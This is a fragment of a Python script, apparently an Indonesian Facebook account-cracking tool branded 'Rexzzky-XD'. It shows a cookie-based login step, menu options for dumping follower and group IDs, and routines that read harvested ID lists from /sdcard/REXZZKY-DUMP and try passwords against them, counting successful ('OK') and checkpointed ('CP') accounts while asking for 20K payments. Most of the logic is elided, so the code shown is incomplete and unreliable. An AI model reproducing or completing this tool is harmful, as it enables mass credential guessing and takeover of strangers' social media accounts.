...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mREXZZKY_XD_xy')
...
def banner():
	print("""%s
    _     _____ ___      __  ______   __  ____  ___   _ 
 | |   | ____/ _ \     \ \/ /  _ \  \ \/ /\ \/ / \ | |
 | |   |  _|| | | |_____\  /| | | |  \  /  \  /|  \| |
 | |___| |__| |_| |_____/  \| |_| |  /  \  /  \| |\  |
 |_____|_____\___/     /_/\_\____/  /_/\_\/_/\_\_| \_|
   (JANGAN LUPA BERDOA BANG''')  WELCOME TO script Rexzzky-XD                                                                     
"""%(O))                                                                                                  
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t[blue]©©© Saran Ektensi : [green]Cookiedough[blue] ©©©'))
...
def menu(my_name,my_id):
	...
	cetak(nel('\t𝚂𝙴𝙻𝙰??𝙰𝚃 𝙳𝙰𝚃𝙰𝙽𝙶 [yellow]%s[white] BAGI GUA 20K'%(my_name)))
	print(f'Your Idz : '+str(my_id))
	print(f'Your Ip  : {ip}')
	print('')
	print('1. XRACK Follower ')
	print('2. XRACK Pengikut ')
	print('3. DUMPZ IDZ')
	print('4. XRACK Moshi Moshi')
	print('5. XRACK Irasshaimase')
	print('0. 𝙺𝙴𝙻𝚄𝙰𝚁 (𝐇𝐚𝐩𝐮𝐬 𝐂𝐨𝐨𝐤𝐢𝐞)      ')
	_____Rexzzky__xd_____ = input('\n|──> 𝐒𝐞𝐥𝐞𝐜𝐭 : ')
	if _____Rexzzky__xd_____ in ['1']:
		dump_massal()
	elif _____REXZZKY__XD_____ in ['2']:
		dump_follower()
	elif _____Rexzzky__xd_____ in ['3']:
		grup()
	elif _____Rexzzky__xd_____ in ['4']:
		crack_file()
	elif _____Rexzzky__xd_____ in ['5']:
		result()
	elif _____Rexzzky__xd_____ in ['0']:
...
def grup():
	...
	if berr2=='Masuk Facebook':
		...
		REXZZKY_xy('>> Grup Tidak Di Temukan ')
		time.sleep(0.5)
		grup()
	else:pass
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/REXZZKY-DUMP')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/REXZZKY-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/REXZZKY-DUMP/'+geh,'r').read().splitlines()
		except:
...
def passwrd():
	...
	banner()
	print('')
	print(f'|𝐇𝐀𝐒𝐈𝐋 {h}𝐎𝐊{x} BAYAR 20K  : {h}OK/%s {x}'%(okc))
	print(f'|𝐇𝐀𝐒𝐈𝐋 {k}𝐂𝐏{x} BAYAR 20K : {k}CP/%s {x}'%(cpc))
	print(f'| BAYAR??20K  ??MAU KREK {m}500{x} 𝐈𝐝𝐳\n')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{H}[REXZZ-XD] {P}{b}{loop}{P}/{u}{len(id)}{P}/{P}{H}{ok}{P}/{P}{k}{cp}{x}/{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/REXZZKY-DUMP')
	except:pass
